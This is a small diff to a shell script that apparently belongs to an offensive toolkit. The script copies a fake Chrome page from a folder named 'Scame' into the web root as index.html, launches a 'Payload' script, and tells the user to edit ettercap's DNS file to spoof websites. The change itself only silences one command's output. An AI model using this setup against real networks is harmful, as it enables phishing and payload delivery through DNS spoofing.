@@ -135,7 +135,7 @@ then
 	cp Scame/chrome.html /var/www/html &>/dev/null
 	cp Scame/index.ico /var/www/html &>/dev/null
 	cp Scame/th.jpeg /var/www/html &>/dev/null
-	mv /var/www/html/chrome.html /var/www/html/index.html 
+	mv /var/www/html/chrome.html /var/www/html/index.html &>/dev/null
 
 	xterm -e tools/scripts/Payload
 echo "Now you can Go to /etc/ettercap/etter.dns and edit file to spoof websites."
